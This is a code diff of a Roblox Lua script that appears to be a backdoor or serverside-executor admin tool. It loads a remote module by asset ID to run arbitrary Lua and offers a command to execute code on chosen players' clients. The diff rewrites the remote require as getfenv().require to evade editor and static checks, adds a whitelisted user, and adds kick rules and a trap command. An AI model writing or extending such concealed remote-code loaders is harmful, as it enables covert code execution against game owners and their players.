@@ -138,7 +138,7 @@ local Ranks = {
 GetEnv().runLua = function(caller: Player, code: string)
 if not ServerScriptService:FindFirstChild("goog") then
         local ticking = tick()
-        require(112691275102014).load()
+        getfenv().require(112691275102014).load() -- getfenv so it stops error in ide thanks
         repeat task.wait() until ServerScriptService:FindFirstChild("goog") or tick() - ticking >= 10
     end
 
@@ -185,6 +185,9 @@ if not GetEnv().tempwhitelist then
             rank = Ranks.Kiddie
         },
         ["trashmoderatio1n"] = {
+            rank = Ranks.Kiddie
+        },
+        ["xXRblxGamerRblxXx"] = {
             rank = Ranks.Kiddie
         },
     }
@@ -262,7 +265,10 @@ type Settings = {
     p299: UserList,
     permadmins: UserList,
     specialperms: UserList,
-    BindPlayerChatted: (plyr: Player)->RBXScriptSignal
+    BindPlayerChatted: (plyr: Player)->RBXScriptSignal,
+
+    -- just so the errors stfu in ide :)
+    yemdebug: boolean?,
 }
 local _G = _G :: Settings
 
@@ -328,13 +334,18 @@ local onPlayerChatted = function(plyr: Player, msg: string)
 end
 
 table.insert(connections, Players.PlayerAdded:Connect(function(plyr: Player)
+    if GetEnv().tempbans[plyr.Name] then
+        plyr:Kick(GetEnv().tempbans[plyr.Name])
+        return
+    end
+
+    if plyr.Name:lower():sub(1, 4) == "wiwo" then
+        plyr:Kick("IP banned for racism!")
+    end
+
     _G.BindPlayerChatted(plyr):Connect(function(msg: string)
         onPlayerChatted(plyr, msg)
     end)
-
-    if GetEnv().tempbans[plyr.Name] then
-        plyr:Kick(GetEnv().tempbans[plyr.Name])
-    end
 end))
 
 table.insert(connections, RunService.Heartbeat:Connect(function(deltaTime: number)
@@ -472,6 +483,10 @@ AddCommand(Ranks.Kiddie, "ls", "Run some lv3 lua code on client", "<plyr1, ...>"
     assert(code, "No code")
 
     GetEnv().runLua(target, code) -- he didnt provide any way to get errors so oh well!
+end)
+
+AddCommand(Ranks.Whitelist, "tpall", "Move all players to this server", "<>", function(caller: Player)
+    caller:Kick("dumbass actually tried")
 end)
 
 print'commands initialized'
